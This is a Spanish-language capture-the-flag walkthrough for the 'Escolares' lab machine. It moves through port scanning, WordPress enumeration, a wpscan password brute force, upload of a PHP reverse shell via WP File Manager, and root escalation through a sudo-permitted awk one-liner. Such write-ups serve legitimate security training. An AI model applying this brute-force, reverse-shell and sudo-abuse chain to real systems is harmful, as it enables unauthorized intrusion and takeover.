# Maquina Escolares
- Tags: #ps
---
## Enlace al laboratorio
**[Máquina Escolares](https://mega.nz/file/ZXckGSob#QBn80M3tFNTrKCJwZ1lIh-9Rafx5sdlG3lyCT9FPYes)**

## Configuración Laboratorio
```bash
7z x escolares.zip # Desplegamos el laboratorio
sudo bash auto_deploy.sh escolares.tar # Desplegamos el laboratorio
```

## Fase Reconocimiento
**Dirección IP del target**
```bash
172.17.0.2
```

**Lanzamos una traza ICMP para determinar si tenemos conectividad con el target**
```bash
ping -c 1 172.17.0.2
```

**Gracias al TTL determinamos que estamos ante una máquina Linux**
```bash
wichSystem.py 172.17.0.2
172.17.0.2 (ttl -> 64): Linux
```

## Fase Enumeración Puertos y Servicios
**Realizaremos descubrimiento de puertos con nuestra herramienta en python mediante TCP**
```bash
escanerTCP.py -t 172.17.0.2 -p 1-65000
```

**Usamos Nmap para realizar descubrimiento de puertos**
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

**Parseamos la información más relevante del escaneo**
```bash
extractPorts allPorts
```

**Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detrás de estos puertos**
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicio SSH expuesto:**
```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
```

## Fase Enumeración Web
**Realizamos detección de las tecnologías usadas por este servicio**
```bash
whatweb http://172.17.0.2 # No reporta nada crítico
```

**Realizamos enumeración de rutas con un script**
```bash
nmap --script http-enum -p 80 172.17.0.2
```

**Resultado:**
```
/wordpress/: Blog
/info.php: Possible information file
/phpmyadmin/: phpMyAdmin
/wordpress/wp-login.php: Wordpress login page.
```

**Ingresando al sitio detectamos que posiblemente estamos ante un CMS WordPress**
```bash
http://172.17.0.2/
```

**Realizamos Fuzzing para enumerar directorios en la web**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Resultado:**
```
/assets/              (Status: 200) [Size: 1963]
/wordpress/           (Status: 200) [Size: 84176]
/phpmyadmin/          (Status: 200) [Size: 18605]
```

**Tenemos un formulario de contacto donde encontramos una ruta no detectada previamente: `/profesores.html`**
```bash
http://172.17.0.2/contacto.html # Probaremos sanitización de inputs
```

**En esta nueva ruta tenemos información de posibles usuarios en el sistema. Posible usuario administrador: `luis`**

### Fase Enumeración WordPress
**Realizando Fuzzing sobre WordPress**
```bash
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,xml,txt,js,html,sh
```

**Resultado:**
```
/wp-content           (Status: 301) [Size: 323]
/wp-login.php         (Status: 200) [Size: 6590]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 324]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 321]
/xmlrpc.php           (Status: 405) [Size: 42]
```

**Tenemos un código de estado 302 Redirect que requiere configuración en `/etc/hosts`**
```bash
/wp-signup.php        (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-login.php?action=register]
```

**Configuración de `/etc/hosts`:**
```
# Target    Domain
172.17.0.2  escolares.dl
```

**Accedemos bajo el nuevo dominio:**
```bash
http://escolares.dl/ 
http://escolares.dl/wordpress/ # Obtenemos posible sobrenombre de administrador: luisillo
```

**Realizamos enumeración con wpscan para el usuario luis (administrador)**
```bash
diccionario_cupp.txt # Diccionario personalizado basado en: luis / luisillo
```

**Aplicamos ataque de fuerza bruta:**
```bash
wpscan --url http://escolares.dl/wordpress/ -U luisillo --passwords diccionario_cupp.txt
```

**Credenciales válidas:**
```
username: luisillo
password: Luis1981
```

**URL para probar credenciales:**
```bash
/admin (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-admin/]
```

## Fase Explotación
**Nota:** Atacaremos el archivo: `WP File Manager > Wordpress > uploads` para subir un reverse shell PHP

**Descargamos el script de reverse shell:**
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git --depth=1
```

**Configuramos parámetros en `php-reverse-shell.php`:**
```php
$ip = '$IP';    # Nuestra dirección IP
$port = $PORT;  # Puerto en escucha
```

**Una vez cargado en `uploads`, accedemos al recurso:**
```bash
http://172.17.0.2/wordpress/wp-content/uploads/php-reverse-shell.php
```

## Fase Escalada de Privilegios
**Listando el directorio `/home`:**
```bash
ls -l /home
-rwxrwxrwx 1 root     root       23 Jun  8  2024 secret.txt
```

**Credenciales del usuario luisillo:**
```bash
luisillopasswordsecret
```

**Migración de usuario:**
```bash
su luisillo # (luisillopasswordsecret)
```

**Verificamos permisos sudo:**
```bash
sudo -l
```

**Resultado:**
```
User luisillo may run the following commands on 70f7732de030:
    (ALL) NOPASSWD: /usr/bin/awk
```

### Fase Escalada a Root
**Explotamos el binario awk:**
```bash
sudo -u root /usr/bin/awk 'BEGIN {system("/bin/bash -p")}'
```

**Verificamos privilegios:**
```bash
root@70f7732de030:~# whoami
root
```